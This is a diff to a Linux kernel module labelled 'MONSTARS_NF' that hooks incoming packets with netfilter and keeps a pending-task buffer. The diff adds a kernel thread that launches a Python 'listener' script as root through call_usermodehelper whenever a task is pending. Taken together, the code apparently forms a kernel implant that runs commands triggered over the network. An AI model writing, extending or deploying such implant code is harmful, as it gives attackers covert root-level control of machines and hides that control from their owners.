@@ -1,7 +1,9 @@
 
+#include <linux/delay.h>
 #include <linux/init.h>
 #include <linux/ip.h>
 #include <linux/kernel.h>
+#include <linux/kthread.h>
 #include <linux/module.h>
 #include <linux/netfilter.h>
 #include <linux/netfilter_ipv4.h>
@@ -9,6 +11,7 @@
 #include <linux/string.h>
 #include <linux/tcp.h>
 #include <linux/udp.h>
+#include <linux/umh.h>
 #include <linux/version.h>
 
 #include <stddef.h>
@@ -28,6 +31,7 @@ static struct proc_ops s_procfileops;
 static struct file_operations s_procfileops;
 #endif
 
+static struct task_struct *s_kthread = NULL;
 static bool s_task_pending = false;
 static char s_current_task[MAX_DATA_SIZE] = {0};
 
@@ -131,6 +135,34 @@ unsigned int nf_callback(unsigned int hooknum, struct sk_buff* sockbuf, const st
     return retval;
 }
 
+
+// worker thread
+int task_thread(void *data)
+{
+    char *um_args[] = {"/usr/bin/python3", "/home/josh/listener.py", NULL};
+    char *um_env[] = {"HOME=/", NULL};
+
+    KERNEL_LOG("MONSTARS_NF : Task thread started\n");
+
+    while(!kthread_should_stop())
+    {
+        ssleep(1);
+        if (s_task_pending)
+        {
+            // spawn userland cmd handler
+            KERNEL_LOG("MONSTARS_NF : Spawning usermode helper\n");
+            if (0!= call_usermodehelper("/usr/bin/python3", um_args, um_env, UMH_WAIT_PROC))
+            {
+                KERNEL_LOG("MONSTARS_NF : Usermode helper exec failed\n");
+            }
+            s_task_pending = false;
+        }
+    }
+    KERNEL_LOG("MONSTARS_NF : Task thread terminated\n");
+    return 0;
+}
+
+
 // Setup
 int __init init_module()
 {
@@ -139,6 +171,7 @@ int __init init_module()
     s_task_pending = false;
 
     // Declare and initialize netfilter hook
+
     s_hookops.hook      = (nf_hookfn *) nf_callback;
     s_hookops.hooknum   = NF_INET_PRE_ROUTING;
     s_hookops.pf        = PF_INET;
@@ -168,7 +201,16 @@ int __init init_module()
     if (NULL == s_procfile)
     {
         KERNEL_LOG("MONSTARS_NF : Error creating /proc file!\n");
-        retval = 1;
+        retval = 2;
+    }
+
+    // start kthread
+
+    s_kthread = kthread_run(task_thread, NULL, "thread");
+    if (NULL == s_kthread)
+    {
+        KERNEL_LOG("MONSTARS_NF : Error starting kthread!\n");
+        retval = 3;
     }
     
     KERNEL_LOG("MONSTARS_NF : Module init returned %d\n", retval);
@@ -189,6 +231,12 @@ void __exit cleanup_module()
     if (NULL != s_procfile)
     {
         proc_remove(s_procfile);
+    }
+
+    // stop kthread
+    if (NULL != s_kthread)
+    {
+        kthread_stop(s_kthread);
     }
 
     KERNEL_LOG("MONSTARS_NF : Module decharged.\n");
